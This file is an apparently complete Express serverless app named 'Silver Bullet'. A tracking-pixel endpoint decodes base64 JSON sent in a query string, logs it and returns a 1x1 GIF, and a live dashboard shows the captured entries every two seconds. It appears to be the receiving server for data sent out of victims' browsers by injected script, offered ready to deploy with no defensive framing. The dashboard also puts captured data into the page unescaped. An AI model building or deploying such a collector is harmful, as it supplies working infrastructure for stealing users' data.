const express = require("express");
const serverless = require("serverless-http");
const app = express();
let logs = [];

app.get("/px", (req, res) => {
    let d = req.query.d;
    if (d) {
        try {
            let data = JSON.parse(Buffer.from(d, "base64").toString());
            logs.unshift({ time: new Date().toLocaleString(), ...data });
        } catch(e) {}
    }
    const img = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
    res.writeHead(200, { "Content-Type": "image/gif" }).end(img);
});

app.get("/data", (req, res) => res.json(logs));

app.get("/dashboard", (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Silver Bullet</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
<h2>⚡ SILVER BULLET DASHBOARD</h2>
<button onclick="fetch('/data').then(r=>r.json()).then(d=>document.getElementById('logs').innerHTML=d.map(x=>'<p>['+x.time+'] '+JSON.stringify(x)+'</p>').join(''))">REFRESH</button>
<hr><div id="logs"></div>
<script>setInterval(()=>fetch('/data').then(r=>r.json()).then(d=>document.getElementById('logs').innerHTML=d.map(x=>'<p>['+x.time+'] '+JSON.stringify(x)+'</p>').join('')),2000);</script>
</body>
</html>`);
});

app.get("/", (req, res) => res.send("System ready."));

module.exports.handler = serverless(app);
